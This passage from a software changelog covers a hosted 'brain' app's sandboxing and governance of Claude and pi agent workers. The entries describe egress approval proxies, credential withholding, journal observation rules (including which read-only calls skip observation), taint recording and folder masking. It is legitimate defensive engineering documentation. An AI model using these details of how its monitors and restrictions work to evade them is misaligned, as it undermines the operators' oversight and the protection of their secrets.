- 79bab30: A strict, voice or autonomous turn now sees its own applications in the same turn (#2848). Its worker reads a turn data tree at `/tmp/brain-worker-data`: the documents as the turn started plus every change the turn's host applications committed, with a search index the server brings up to date before the next search. `brain` commands in either shell, Claude's `brain` MCP server and pi's brain tools, `read_file`, `grep`, `brain_read` and shell use it as their data root, while `brain.config.ts`, modules and module settings still load from the frozen view at the brain path. A peer's change made during the turn does not enter it. Admission copies the startup documents into the tree and seeds its index (about 0.1-0.4 s on 2,000 notes).

  Claude's `Read`, `Grep` and `Glob`, and shell commands that name the brain path, still see the turn-start bytes. A Claude `Read` of a file the turn changed is refused and names `mcp__brain__brain_read`, which reads the current version.

  A provider-restricted turn's own applications now reach its private search index too (#2846), and no masked document does: a change enters only if its path is outside the masked folders, neither its result nor its base declares a type the recipient may not see, and its base is what the turn could already see, never a peer's. Such a turn's `brain_add` plans on its own data tree and index, in a masked worker. The private index is now read-only to the agent: `brain index` and `brain` CLI captures inside a masked turn fail, and the server keeps it current instead.

  Core maps a worker's `BRAIN_WORKER_CONFIG_ROOT` back to its `BRAIN_WORKER_DATA_ROOT` during root discovery, and readers there retry `SQLITE_READONLY_RECOVERY` and `SQLITE_BUSY_RECOVERY` a bounded number of times. `@schlessera/brain/module` exports `configurationRoot(root)`; jobs scoring reads `settings/jobs.json` and its criteria document through it. `BackendBridge.awaitIndex` takes the tool's input as an optional second argument.

- 086db5b: On hosts with managed native storage, run governed and strict Claude turns on their own turn egress proxy and the host inference relay by default. Every connection becomes a governance event, policy limits apply, and a connection to an outward host waits for approval unless the tool call in progress was classified as a read or an approved outward action to that host. The capabilities note states recorded egress only for a worker actually routed through the proxy. Elsewhere those turns keep their current network, and `runtime.workerHost.governed.egress` on `GET /api/status` says which applies.

  The relay forwards to the server-selected route (a profile's `baseUrl`, else `ANTHROPIC_BASE_URL`). A custom origin may receive the host's Claude login only when `BRAIN_UI_CLAUDE_OAUTH_ORIGINS` lists it exactly. **Migration:** if a subscription profile or `ANTHROPIC_BASE_URL` points Claude at a custom origin on a host with managed native storage, add that origin to `BRAIN_UI_CLAUDE_OAUTH_ORIGINS`, or those turns are refused before their prompt is sent.

  A model-discovery cache entry in the brain no longer supplies a profile's `baseUrl`, credential variable names, model aliases or tools; only the fields discovery itself writes are read back.

- 9b8239d: Record and show host turn lifecycle, admission and first-frame timing alongside unchanged backend-run durations.
- 8344571: A strict, voice or autonomous turn that applies an image mask now reads the new PNG in its own data tree before its next read, and the scratch files the mask's prune removed are gone from it; a Claude `Read` of the mask at the brain path is refused like any other path the turn applied. In a provider-masked turn the PNG enters the tree only under the provenance rule, compared byte for byte. `AppliedEffect` accepts `Uint8Array` content and base (additive).
- 9423920: Negotiate host permission outcomes in the client and add scoped voice refusals with an earcon and visual fallback when exact permission speech is unproven. Keep approval controls, original-input attribution, once-only cues, terminal and reconnect receipts tied to the host's actual result. Publish posture-denied outcomes without raising a grant card.
- 1faf79c: Governed and strict turn workers no longer receive the `brain` CLI's provider keys (#1666). A worker keeps only its own inference credential where the host does not relay it, plus any name an operator admits through `BRAIN_UI_SUBPROCESS_ENV_EXTRA`. `GEMINI_API_KEY`, `OPENAI_API_KEY`, `TYPESAFE_API_KEY` and the other provider credentials stay on the host. The brain's `.env*` files were already unreadable in these workers, and now there is a test for that.

  A `brain` command that needs a withheld key names the provider and the key, and falls back where it can. `brain search` returns keyword results, `brain index --embeddings` builds a keyword index, and an enabled `jev` reranker keeps lifecycle order. `brain process`, `brain image` and `brain video watch` refuse, because the built-in providers' own missing-key errors name a withheld key too. Each notice ends in a `[provider_unavailable …]` token. The worker learns which keys it lacks from the new `BRAIN_WITHHELD_KEYS` variable, which holds names only. The server records each token in a tool's result as a `provider_unavailable` governance event, at most 20 per turn. The capabilities note now says that secrets are hidden and names the keys a worker keeps.

  To keep the old behaviour for a key until the metered relays land (#1673), admit it explicitly with `BRAIN_UI_SUBPROCESS_ENV_EXTRA`. Outside a worker, a brain without keys behaves as before.

- 7d1a31d: Run qualified workers under a distinct host identity with authenticated supervision, retained bounded mounts and cancellable private-file recovery.

### Patch Changes

- 2f10e04: Commit account and security administration, passkeys, reference grants and push registration on the SQLite write worker at FULL durability, so their fsyncs do not block requests. Revocation responses await the durable revocation, and concurrent VAPID first uses share one stored key pair.
- 07fbce8: Commit Action notice enrollment, digests, delivery attempts and zone preferences off the server event loop.
- bd4eba3: Governed and strict Claude turns on an API-billed profile now run on the turn egress proxy and the host inference relay too, on hosts with managed native storage. The relay sends the profile's `ANTHROPIC_API_KEY` or `ANTHROPIC_AUTH_TOKEN` to the profile's own route; the worker holds only a placeholder, and neither the variable the profile names nor a host `CLAUDE_CODE_OAUTH_TOKEN` reaches it. Billing is unchanged. The `brain` CLI inside such a worker no longer sees that key either, until its own providers are relayed (#1673). Only the credential the profile declares is sent: an ambient `ANTHROPIC_AUTH_TOKEN` no longer rides along to the profile's route. Project or managed settings that move the route, set a credential variable or configure an `apiKeyHelper` refuse the turn before its prompt is sent, as a transport failure. A host Claude login file linked into the brain refuses relayed turns. `runtime.workerHost.governed.egress` no longer lists API-key profiles as unrouted.
- f2b91c5: Changed: the hosted server commits local exchanges, a turn's classified blocks and classifier confidence, and a saved worker preference (`PUT …/profile`) on its SQLite write worker at `synchronous=FULL` instead of on the event loop (#2850). A local exchange is still carried by the next prompt while it commits, and is answered once stored; a replayed history waits for the classified blocks submitted before it.
- 0539931: Keep admitted HTTP handlers alive until they finish before closing server operational state. Refuse new requests during shutdown and cancel stalled request bodies without waiting for an unresponsive body producer.
- 1ede8ab: Exclude shell calls ended by the user's Stop from governance roadblocks on both backends, while retaining genuine nonzero exits and failures completed before cancellation. Pi reports an aborted shell execution as an abort error instead of an ordinary nonzero result.
- caae12d: Revalidate Storage maintenance authority after asynchronous worker preparation
  and record command entry only when preparation and authorization succeed.
- cf70a33: Retain Claude-generated session titles while attributing measured title-helper usage separately from main-conversation and cache diagnostics. Reconcile supported OTLP receipts within the existing cumulative accounting transaction so helper spend appears once, preserve unmatched usage as unattributed, and respect configured operator telemetry and opt-outs.
- b17e349: `app.close()` no longer waits indefinitely for brain CLI reads or a plain index run. In-flight runs get a 10 s grace period; then shared runs (reads and plain `index`, whose outputs are disposable) are cancelled. Runs that write Markdown or git are never cancelled by this; every other run keeps its existing shutdown behaviour.
- 04a6595: Refuse unsupported frontmatter languages before parser engine dispatch in data-only governance, skills, schedules and content workflows. Preserve supported YAML, jobs' legacy JSON scoring input, policy last-valid fallback, approval checks, cache independence and travel's custom YAML date parser.
- 15a5a3b: Count the brain's disposable search index once per turn at its largest observed size, and stop counting its publication copies once they are gone, so a strict pi turn's host-applied edits no longer pause on the `turn_bytes` scope cap because each index refresh was charged in full.
- 64af9b5: Changed: the hosted server commits composer drafts, voice transcription claims and settings on its SQLite write worker at FULL durability. Draft reads wait for accepted-message tombstones, providers dispatch only after their transcription claim commits, and settings replies see committed preferences while standalone and cron callers keep their inline behavior.
- 9d1e078: Keep history-load diagnostics private while preserving voice-opening cleanup and draft recovery.
- 8cb0fdb: Require actual headroom below the existing finite scope continuation ceiling, including a fresh eligibility check before accepting Continue. Explain exhausted recovery with Stop only, preserve exact observed counts, and remove stale Continue retries and announcements.
- e1ab485: The first provider-policy turn after the server starts is no longer refused with "An active peer did not retain the requested provider folders". A writer started with the server, such as the boot-time scratch prune, plans its retained folders before any turn has translated a type selector, so its plan lacks those folders. Admission now waits up to 30 seconds for such an earlier writer to finish instead of refusing at once. A peer still active at that bound refuses as before, and peers that are unsafe whatever they do next (unaccounted, unverified or unpinned host plans) still refuse immediately.
- b90d60d: Keep queued voice work stopped while its epoch drains a storage failure, then cancel it when the epoch ends.
- 5b476a7: Accept bounded UTF-8 binary JSON frames from Gemini Live without changing host-owned conversation authority.
- 880f005: Keep Gemini Live connections open for empty JSON object envelopes after setup while retaining rejection of unknown-only nonempty payloads and existing input attribution guards.
- 8351c98: Changed: the hosted server commits governance events raised outside a journal transaction, the session's first taint, roadblock records and turn scope rows on its SQLite write worker at `synchronous=FULL`, in submission order with journal and Activity writes, instead of on the event loop (#2850). A turn's egress connection sends its first byte only after its taint has committed, and admission counts that taint from the moment it is submitted.
  Changed: the egress proxy awaits a promise returned from its `admitted` hook before the connection's first upstream byte.
- caf5ee0: Changed: the hosted server commits a governed turn's admission records (the policy it was admitted under, provider exposures, masked lineage and its protected-path manifest) on its SQLite write worker at `synchronous=FULL` instead of on the event loop (#2850). Admission still waits for each record before the turn goes on.
- 9a3af9b: Resolve inference credentials per dispatch and serialize host OAuth access with credentialed maintenance through a crash-safe kernel lock.
- c888781: Honor declared writer gates in legacy asynchronous host execution, retaining admission through command and output cleanup before governed transitions.
- 4ba50d8: Keep host GitHub credentials, including the skills installer token, out of maintenance and agent workers. Share the credential names across environment boundaries while preserving the mirror transport and skills installer's dedicated tokens and generic fallback.
- f1f3ad7: Count ignored-file observed bytes once per turn per path using the largest observed size, preserving hashed-version accounting, and display session-profile scope byte caps in readable binary units.
- 9f893b5: A hosted turn refused for a hardlink out of a masked provider folder now names the same masked file on every host. The check reads each directory in a fixed order instead of the filesystem's own.
- ae6b804: A provider policy that selects a folder inside another selected folder, such as `me/**` beside `me/sub/**`, no longer fails every hosted turn at worker launch. The nested folder is hidden by its ancestor's mask, and the masks, retention, private index and hardlink check share that one set.
- c696f99: Changed: the turn journal keeps its tables in its own SQLite file, `DB_PATH.journal.db`, attached to the UI database; they move there on the first start. Its capacity is that file's page count and WAL, with no b-tree walk on a journal write (#2789).
  Changed: a steering change's governance event that did not commit with it is recorded again on start, from the journal.
- ab746a4: A host-applied write that overlapped a journal observation or a scope pause was refused as `authority_revoked` even though the turn's principal was still valid (#2853). With quick applications the window was easy to hit: one write in a turn failed and the next succeeded. An observation or pause now holds the write instead. The write waits outside the shared brain lock, each wait for at most 60 seconds, then commits once the hold clears. Nothing commits while a hold is active. Image masks, policy publication and the other host bridge calls wait the same way. A principal that really lost authority still refuses with `authority_revoked` at once, even mid-wait. A write still held when the 60 seconds run out refuses with `application_failed` and changes nothing, so `authority_revoked` keeps its meaning.
- b2f2f25: Changed: a journal write no longer truncates the SQLite WAL first; admission charges the WAL as it stands and truncates only when that would refuse. Commits stay `synchronous=FULL` (#2789).
  Changed: journal capacity measurement walks only the journal's own SQLite b-trees, not the whole database.
  Changed: a journal row changed outside capacity accounting on the server's connection is refused.
  Changed: the server's maintenance temporary-storage ledger stays open between reservations instead of opening and closing its database each time.
- 34b08d1: Speed up ordinary turn-journal object collection by indexing object pins by hash. The index is built only after reserving its database and WAL growth within the existing journal cap, with sorting in memory and foreign-key enforcement enabled. A near-cap journal defers the upgrade, keeps its existing integrity-checked expiry and collection path, and retries after collection frees enough capacity or on restart. Retention and pin/reservation ownership rules are unchanged.

  Operational backups preserve their canonical schema by omitting this derived index. A restored journal admits and rebuilds it only when capacity allows.

- 66c370b: Keep queued replies visible when a reconnect history read overlaps turn completion. Re-read an invalidated snapshot once and refuse a second invalidated snapshot instead of replacing newer delivered messages.

  Preserve the live assistant message when refreshed history inserts its missing user row.

- 404a98f: Bound the historical host outcomes that the Gemini Live and GPT Live adapters send when a replacement epoch opens. The limit is in exact UTF-8 bytes: 24,000 for Gemini and 7,500 for GPT, of which at most 16,000 and 5,000 may be result text. Selection is newest first. A result that does not fit whole is replaced by its request and state marked `resultOmitted`, and when older outcomes are dropped the block starts with an explicit marker. Gemini now seeds this history in its documented ordered-history mode before any audio. Context that the previous formatter already produced within both limits is sent unchanged; otherwise no joined result is dropped without being marked. The GPT limit is estimated headroom under its documented 8,192-token startup input, not a proven token bound.
- 9bebef7: Clarify maintenance completion and sync-mirror validation: namespace init retains output pipes after the outer monitor can exit, and a teardown artifact must still be refused before transport. Runtime behavior is unchanged.
- 14fd04f: Close masked CLI stdin after worker exit and wait for masked CLI and turn-tree maintenance stdio to be released before settling, within the existing 5 second bound.
- 6814f2c: Record a Claude memory note saved during a turn before that turn's journal closes, now that journal commits run off the event loop. A save still committing when the turn finished was refused after the note had already been written, and the turn ended partial with the note unconfirmed. A save requested after the turn finishes is refused before it writes, and a memory record no longer reuses the sequence of an observation that is still committing (#2893).
- 6c5a4f4: Refuse the legacy host fallback while a provider folder policy is active (#2284). A host process's descendants cannot be bounded, so on a never-governed host a command that would run brain code on the host now throws before any process starts: `HostFallbackRefusedError` naming the folders, or an existing peer refusal that is checked first. This covers complete, streaming and synchronous commands, gated or not, and folders a running writer still retains after the policy changes. A policy file that cannot be read or parsed counts as unknown and refuses too. Without provider folders host fallback still runs, except that an ungated command now also refuses beside a running writer whose folder provenance is unknown.
- e69ade4: Changed: the hosted server commits the Activity notifier's tick, intent delivery status, acknowledgements and retention, and push delivery's subscription bookkeeping on its SQLite write worker at `synchronous=FULL` instead of on the event loop (#2850). A delivery pass settles only once its writes have committed, so the next pass never resends an intent.
- dca0e34: Isolate login failure buckets, passkey challenges, sync admission and message receipt ordering between app instances.
- 498270f: Prepare protected maintenance metadata through the retained native manager and use the verified separate-UID launcher for credential-free helper maintenance. Bind command preparation and cleanup to the owned stage, reject stale or foreign plans, and retain concrete frozen Git inputs read-only inside the existing staging allowance with their writable alias concealed and private control excluded from publication. Preserve directory setgid modes during native output publication. Register only validated, originally absent Git mask scaffolds inside the owned stage, preserving live absence and refusing protected-path changes or incomplete preparation. Credentialed and no-helper paths retain their existing behavior. Native Git qualification covers the documented shared-group metadata envelope; private, non-shared lower Git metadata remains unsupported.
- 066107c: Put the brain's installed CLI first on governed and strict interactive workers' PATH, matching maintenance workers, and explain installation in the sandbox note when it is missing. Restricted autonomous environments retain their fixed PATH.
- cb86cb7: Keep ordinary maintenance working after a strict worker publishes private output. With a separate worker identity, Git input preparation used to refuse once a published `0700` directory existed, so the authenticated index returned HTTP 500. The worker collector now withholds directories its identity cannot search. The server then reads only the nested `.gitattributes` of withheld directories it owns, from the retained checkpoint. Modes and ownership stay unchanged, and aliases, foreign owners and replaced identities still refuse.
- d01fa34: Keep host-owned policy-publication staging inside the approved synchronous journal boundary so history retains the user policy change without temporary agent-attributed noise. Similarly named real agent changes remain recorded; exact bytes, approval checks and partial/unknown failure receipts are preserved.
- 047a1cb: Name the offending hidden path segment when the server application route refuses a write, preserving the Markdown diagnostic for non-Markdown paths and all existing path restrictions.
- 048b686: Record completed fetching and opaque shell calls as the first untrusted input in an interactive session. This supplies pre-proxy command detection only; complete taint enforcement and ordinary egress activation remain separate.
- 0125555: Preserve runtime-written provider transcript entries across turns. Store promoted
  answer-link display mappings and authoritative Pi application receipts in host-owned
  replay metadata so history retains promoted links and receipts without changing
  prior model text or tool results. Recover only missing results for runtime-written
  Pi calls after the worker exits; direct server applications create no provider entry.
- 7150354: Changed: the hosted server commits authentication's per-request principal writes (the `last_seen_at` touch, terminal-principal pruning, ambient principal resolution and a login's new principal) on its SQLite write worker at `synchronous=FULL` instead of on the event loop (#2850). A request never waits for its touch; a login answers once its principal has committed.
- 344ab3a: A provider-restricted hosted turn after one that added or edited notes no longer updates its private search index before it starts (#2833). After each turn's index refresh, the server brings its kept build up to a fresh checkpoint of the brain, off the turn path, under the same rules as before: new notes are added, a changed, removed or newly masked note is rebuilt from nothing, and anything it cannot prove drops the build so the next turn makes a clean one.
- 58b70e8: A provider-restricted hosted turn no longer rebuilds its private search index from scratch on every turn (#2833). The server keeps one host-owned build per policy, mask set and recipient, bound to the native checkpoint it was built from, and reuses it when the turn's checkpoint provably indexes to the same thing: unchanged, or only new notes outside the masked folders, which the incremental index adds. Any other change, such as a note edited, removed or moved into a masked folder, still builds the index from nothing, so no removed or masked text survives in it.
- 19b43c6: Support disjoint private server-state masks below inaccessible server-owned parent directories for separate-identity workers, without exposing their contents or covering required brain and runtime paths.
- 1c5666e: A governed or strict pi turn no longer waits for a full journal observation after a call that is proven read-only (#2834). The host observes after every tool result unless the backend reported, from what the call actually did, that it ran a host bridge read (`brain_read_base`, `query_activity`, `inbox_list`, `inbox_get`, `show_block`, `ask_user*`, `get_current_location`) or pi's own `read_file`, no other call is still running, and no call in the turn could still be writing in the background. `bash`, `grep`, `brain_search` and the other index tools, extension tools, unknown tools and every Claude tool are observed as before, and after one of them every later result in that turn is observed too. Writers are observed after their own result. Only a pi worker that loads no extensions (`loadExtensions: false`, or a restricted autonomous turn) reports this evidence: with extensions loaded, the default, every result is observed as before. Turn begin and finish, the 15-second observation and scope-limit enforcement are unchanged.
- b99489b: Move hosted inbox lifecycle commits off the event loop at FULL durability. Correct the public declaration drift by marking `WsHost.inboxTools` and `WsHostOptions.inboxTools` internal under the #1053 narrowing ruling; these concrete inbox helpers are supplied by `createApp`.
- 7487b90: Stop adding routine inference-budget totals to governed provider prompts. Repair legacy history replay so local commands retain their position and user messages regain voice, thinking and file metadata, without rewriting provider transcripts.
- 37c8629: Close the app-owned SQLite write worker during ordinary shutdown after its consumers and independent push deliveries drain, preserving accepted notification outcomes and retaining bounded diagnostics and counts for settled persistence failures through unconditional cleanup.
- 20a5fc1: Keep successful Activity runs free of run-level failure reasons when a child tool failed and recovered. Child errors remain visible in the trace, and existing rollups are corrected when rolled up again.
- ec05e4e: Seed steering configuration from supported startup and module consumers, excluding incidental dependency and cloned-project manifests.
- 1de1239: Refuse protected folder admission beside an unpinned host writer even when its advisory plan names every protected root. Record host provenance before process creation and refuse the inverse unsafe admission while preserving shared host concurrency.
- fd51cad: Commit schedule proposals, approvals, publication, cancellation and reconciliation off the server's event loop while retaining FULL SQLite durability.
- 6a73a59: Fix Gemini Live setup by omitting the parameter schema for the parameterless host delegation function.
- cb56a71: Accept documented Gemini Live voice activity metadata without closing the audio session. Metadata does not establish input attribution, transcript finalization or permission authority; malformed frames still fail closed.
- abe5086: Apply the existing SQLite busy timeout before enabling WAL so server and cron startup can wait for a transient database lock instead of exiting immediately.
- da1ec5f: Changed: the hosted server commits reference-source, managed-worktree and hygiene writes on its SQLite write worker at full durability, including periodic checkpoint observations, while keeping lease, generation and cleanup effects ordered before their callers continue.
- 2235ab4: Refuse a new governed provider-folder admission while an active peer has an unaccounted or insufficient folder plan. Preserve existing writers, nested shared maintenance and strict consumers; successful plans do not attest mounted privacy.
- 965578d: Use completed response receipts for resumed Claude turns instead of the runtime's session-cumulative cost and model usage. Retain newly observed unstreamed usage separately and once in Activity and session totals, with explicit unknown attribution and partial coverage after missing history or counter rollback. Model identifiers retain their own counters across response snapshots and persisted reconciliation, including names that match inherited JavaScript properties.
- 64af9b5: Changed: the hosted server commits retained retry requests, retry receipts and policy proposal inserts and review saves on its SQLite write worker at FULL durability. Retry invalidation remains fail closed while queued or failed, reservations commit before dispatch, and policy publication waits for its writing review to commit.
- d1e9dba: Admit schedule Git ignore probes through the shared writer gate so native publication retains active peers’ protected folders and waits for exclusive maintenance.
- 335ee04: Apply scratch image masks through an asynchronously prepared native ignore query, and distinguish a missing ignore rule from unavailable verification.

  Keep construction-only clients usable for missing brain paths; validate the canonical brain directory when the query executes under its maintenance lock.

- bb7b5d1: Changed: the hosted server commits the session catalog on its SQLite write worker at `synchronous=FULL`, in submission order, instead of on the event loop (#2850): the session row, accepted work and turn boundaries, message sources, turn failures, the state room, Claude usage accounting, handoff links, labels and session costs, and the worker-profile and policy-proposal binds a new session makes. Reads on the turn path see a write from its submission; the session list, history replays and retry reads wait for the writes submitted before them.
- 88012cf: A Claude or pi agent turn, a pi worker whose initialization or start callback was refused, and a streaming maintenance launch now finish only once every descriptor on their worker's stdio FIFOs is closed in the server, or after the 5 second bound of the worker's `released()` (#2863). Bun closes its own duplicates of those descriptors later, on its thread pool, so on a busy host a finished turn could report itself done with them still open. A streaming launch keeps its output slot and writer gate until then, but reports the worker's exit as before: a caller that reads the streams only after the exit is not held up. A scheduled job run through the host boundary ends only once its launch has settled, so the writer gate is free before the job's host closes its database. The worker's stdin is now closed once it has exited.
- a19ce13: Cut a native journal observation's own cost (#2872). The native brain manager runs its root and loop-device identity checks in one long-lived `python3 -I -S` interpreter instead of a fresh launch per check, with the same programs, paths and refusals. The journal releases the previous native checkpoint after the observation that superseded it is recorded, outside the hold that freezes the turn's workers, at most two pending per observed root; a commit past that waits as before. A release that fails there still stops every active turn and leaves its record partial, and shutdown drains pending releases and reports any checkpoint it could not release.
- 4d3c58d: Freeze a maintenance command's Git attributes in one worker launch instead of one launch per object, which cut each hosted maintenance run's Git preparation by about two thirds on a loaded host.
- 55dbf1c: Retain session-stable prompt appends and deliver changed host facts in owned new tail context, preserving user history and unknown device capabilities.
- ac61ecf: Keep pending dialogue write accounting attached to its stable owner across provisional chat adoption, preserving count and byte bounds and retiring drained bookkeeping.
- ab61774: Changed: the hosted server commits shared storage scan leases and storage maintenance receipts on its SQLite write worker at `synchronous=FULL` instead of on the event loop (#3028). A scan's collector starts only after its lease commits, a maintenance route answers once its receipt has committed, and a cancellation takes effect once it is durable.
- eefed8b: Changed: the hosted server commits its storage history flush and storage notice bookkeeping (the 20-second sweep, and a delivery's begin and finish) on its SQLite write worker at `synchronous=FULL` instead of on the event loop (#2850). Buffered observations are kept until their flush commits, and shutdown waits for the final one.
- 6c16711: Record failed handoff preparation and ordinary chat result messages in Activity, including empty summaries and backend startup failures. Keep successful and cancelled runs free of failure reasons.
- 482ebd1: Group shell compound commands by their body program so a successful plain command can resolve a failed loop in roadblock reports.
- bbb5a41: Send the final session recovery notification after Activity commits so work finished in the background reaches its tracker with the host's completion time.
- 498270f: Keep worker identity probe sentinels in validated server state outside the brain, including memory-backed apps with native lease state, so concurrent checkpoints cannot capture private probe inputs.
- a268b3d: Classify journal steering references by supported input roles instead of arbitrary quoted filenames. Exclude the resolved disposable index and its SQLite sidecars while retaining genuine startup inputs and explicit coverage limitations.
- 1411f0c: Changed: the hosted server commits every turn-budget ledger write (admission, session binding, completed-response and relayed-provider usage, warnings and the SDK backstop) on its SQLite write worker at `synchronous=FULL`, in submission order, instead of on the event loop (#2850). A relayed provider request is admitted only once every earlier budget write has committed.
  Changed: the provider relay awaits a promise returned from its `admit` hook.
- c670449: A strict, voice or autonomous turn's data tree is built faster: admission copies its files and the index seed sixteen at a time off the event loop, requesting a reflink, instead of one file after another, and an aborted admission stops the copy and removes it. On the native fixture this halves the copy (2,000 notes 100 ms to 51 ms, 10,000 notes 471 ms to 245 ms).
- d0697d9: A provider-policy turn whose rules select document types is no longer held for 30 seconds and then refused with "An active peer did not retain the requested provider folders" while a cron job, or a writer started after a server restart, is running. The folders a turn translates those types to are now recorded in the UI database under the policy's hash, so writers in every process, and after a restart, plan them while the policy is unchanged. A record from another policy version or another brain, or one that cannot be read, plans nothing. Admission still translates the types itself and still refuses a writer lacking what it masks. The first turn under a new policy version still waits for writers admitted before it, as before.
- c452cf1: Keep the hosted server answering while the remaining worker checks run. A Claude turn now claims its session at once and then awaits its worker host probe, and a Claude worker's probe and bubblewrap launch are awaited behind the deferred spawn instead of inside the SDK's synchronous callback. A separate-UID worker's exit is polled without blocking, and so are the separate-UID maintenance launch and the scratch mask's git ignore check. The checks, their order and their refusals are unchanged: a refused probe still rejects the turn and leaves no turn behind, and a worker that does not start still names the turn's failure with its own error.
- 6492291: Keep the hosted server answering while a turn's worker checks run. The per-turn worker host probe, the sandbox's scratch git check and the pi worker launch now wait on their bubblewrap workers without blocking the event loop, so `/health` and WebSocket pings no longer stall while a loaded host starts a worker. The checks, their order and their refusals are unchanged; the synchronous forms remain for callers that cannot await.
- 498270f: Collect frozen Git attributes and repository hook inputs under the qualified worker identity so intentional private file modes remain usable without widening host access.
- 5f27615: Retain imported-history lookup failure causes and exactly-once failure metrics in host diagnostics, while keeping resume errors safe for clients.
- 9eb6c83: Preview SVG files as images with a raw-source toggle, and select light SVG image palettes when printing the app.
- 2577504: Changed: the hosted server commits the brain's writer gate on its SQLite write worker at `synchronous=FULL` instead of on the event loop (#2850). Each gate transaction keeps its `BEGIN IMMEDIATE`, so it stays serialized against the cron runner's. A release is submitted at once and settles once it has committed; a host process spawns only after its downgrade has committed and the boundary is still the host fallback; a type folder translation that cannot be recorded refuses the turn.
- Updated dependencies [e1b8980]
- Updated dependencies [c60f956]
- Updated dependencies [bddd0a4]
- Updated dependencies [1f032f9]
- Updated dependencies [2d21e91]
- Updated dependencies [2fe4005]
- Updated dependencies [603a754]
- Updated dependencies [caae12d]
- Updated dependencies [4349af3]
- Updated dependencies [cf70a33]
- Updated dependencies [3b3485e]
- Updated dependencies [b63276f]
- Updated dependencies [7eedceb]
- Updated dependencies [07bf0ee]
- Updated dependencies [04a6595]
- Updated dependencies [d2bb3b3]
- Updated dependencies [11239d6]
- Updated dependencies [8fc9663]
- Updated dependencies [fb219e0]
- Updated dependencies [39d16cb]
- Updated dependencies [0316ccf]
- Updated dependencies [1977f52]
- Updated dependencies [d3a49c1]
- Updated dependencies [498270f]
- Updated dependencies [800d965]
- Updated dependencies [3fb5199]
- Updated dependencies [8351c98]
- Updated dependencies [aeaaf77]
- Updated dependencies [9a3af9b]
- Updated dependencies [4ba50d8]
- Updated dependencies [bde209b]
- Updated dependencies [5e6446a]
- Updated dependencies [cf25c12]
- Updated dependencies [498a601]
- Updated dependencies [ff70ec1]
- Updated dependencies [f3c6fdc]
- Updated dependencies [477c8f7]
- Updated dependencies [62cb35c]
- Updated dependencies [1135899]
- Updated dependencies [ea4c76c]
- Updated dependencies [c06dbb4]
- Updated dependencies [d6a07c4]
- Updated dependencies [c89045b]
- Updated dependencies [b2f2f25]
- Updated dependencies [abf5b3e]
- Updated dependencies [85873db]
- Updated dependencies [07bf0ee]
- Updated dependencies [00a583b]
- Updated dependencies [e261d53]
- Updated dependencies [3f68a36]
- Updated dependencies [9bebef7]
- Updated dependencies [5322d30]
- Updated dependencies [69151ca]
- Updated dependencies [b70d422]
- Updated dependencies [1794e72]
- Updated dependencies [d9ac37b]
- Updated dependencies [9f930f6]
- Updated dependencies [046b6ae]
- Updated dependencies [5b34b6f]
- Updated dependencies [498270f]
- Updated dependencies [49c8b1d]
- Updated dependencies [5600c72]
- Updated dependencies [caae12d]
- Updated dependencies [066107c]
- Updated dependencies [6099bdf]
- Updated dependencies [d85a649]
- Updated dependencies [6470786]
- Updated dependencies [ce3345b]
- Updated dependencies [a90490e]
- Updated dependencies [b9805a4]
- Updated dependencies [0125555]
- Updated dependencies [19b43c6]
- Updated dependencies [8823a28]
- Updated dependencies [d9f4405]
- Updated dependencies [1c5666e]
- Updated dependencies [918b34a]
- Updated dependencies [c164899]
- Updated dependencies [61399d1]
- Updated dependencies [775cd1b]
- Updated dependencies [613f1bd]
- Updated dependencies [498270f]
- Updated dependencies [3cc0a60]
- Updated dependencies [caae12d]
- Updated dependencies [650caaf]
- Updated dependencies [f62ce30]
- Updated dependencies [9c52e8c]
- Updated dependencies [e7c037b]
- Updated dependencies [965578d]
- Updated dependencies [cb5db6e]
- Updated dependencies [790d593]
- Updated dependencies [335ee04]
- Updated dependencies [02c74a3]
- Updated dependencies [1ba7673]
- Updated dependencies [8f7430c]
- Updated dependencies [a19ce13]
- Updated dependencies [8d06beb]
- Updated dependencies [b192ca0]
- Updated dependencies [8822aed]
- Updated dependencies [55dbf1c]
- Updated dependencies [8476426]
- Updated dependencies [25a97da]
- Updated dependencies [caae12d]
- Updated dependencies [caae12d]
- Updated dependencies [2d86dc5]
- Updated dependencies [d6ad60a]
- Updated dependencies [1411f0c]
- Updated dependencies [79bab30]
- Updated dependencies [086db5b]
- Updated dependencies [9b8239d]
- Updated dependencies [c452cf1]
- Updated dependencies [6492291]
- Updated dependencies [9423920]
- Updated dependencies [1faf79c]
- Updated dependencies [7d1a31d]
  - @schlessera/brain-ui-sdk@0.44.0
  - @schlessera/brain-common@0.44.0
  - @schlessera/brain-geo@0.44.0
  - @schlessera/brain-render-template@0.44.0

## 0.43.1

### Patch Changes

- @schlessera/brain-ui-sdk@0.43.1
- @schlessera/brain-render-template@0.43.1
- @schlessera/brain-geo@0.43.1
- @schlessera/brain-common@0.43.1

## 0.43.0

### Minor Changes

- 4af7b2f: Replace repeated whole-brain journal and worker input copies with managed Btrfs checkpoints and changed-only retained history. Hosted apps now require a qualified native storage service and explicit finite volume capacity; unsupported storage refuses with setup guidance instead of a copy fallback. The retained history limit remains 10 GiB and staged worker outputs keep their existing allowance.

### Patch Changes

- b0c4a82: Notify session recovery clients after asynchronous turn finalization so trackers receive committed terminal timestamps.
- Updated dependencies [4af7b2f]
  - @schlessera/brain-ui-sdk@0.43.0
  - @schlessera/brain-render-template@0.43.0
  - @schlessera/brain-geo@0.43.0
  - @schlessera/brain-common@0.43.0

## 0.42.1

### Patch Changes

- b6f9060: Keep complete immutable startup inputs outside the bounded staged-write allowance. Private copy-on-write output workspaces retain the 256 MiB default and aggregate admission, including after lower-only deletions. Release input copies and output namespaces on abrupt server exit, qualify actual writable staging before reporting host availability, and report named input-capacity refusals through boot/status without host execution fallback.
- Updated dependencies [b6f9060]
  - @schlessera/brain-ui-sdk@0.42.1
  - @schlessera/brain-render-template@0.42.1
  - @schlessera/brain-geo@0.42.1
  - @schlessera/brain-common@0.42.1

## 0.42.0

### Minor Changes

- 52cbd1d: Enforce admitted command deny and confirmation policies in both interactive adapters, recheck approved edits, and retain attributed rule receipts after Activity detail pruning.
- 8b4fbdc: Give each hosted worker a private, filesystem-limited turn-temp tmpfs,
  defaulting to 256 MiB, with whole-lifetime aggregate admission shared by both
  backends. Keep XDG writes inside it and real HOME read-only; retain a directory
  descriptor so linked deliverables can still be promoted after exit.

  Add the `turn_temp` tool for usage and scoped purge, preserving output-linked
  files unless named paths explicitly force their removal. Record purge governance
  events and explain the allowance, 80% warning and out-of-space recovery in the
  sandbox note. Add host overrides `BRAIN_UI_TURN_TEMP_BYTES` and
  `BRAIN_UI_TURN_TEMP_BUDGET_BYTES`; unavailable capacity refuses as
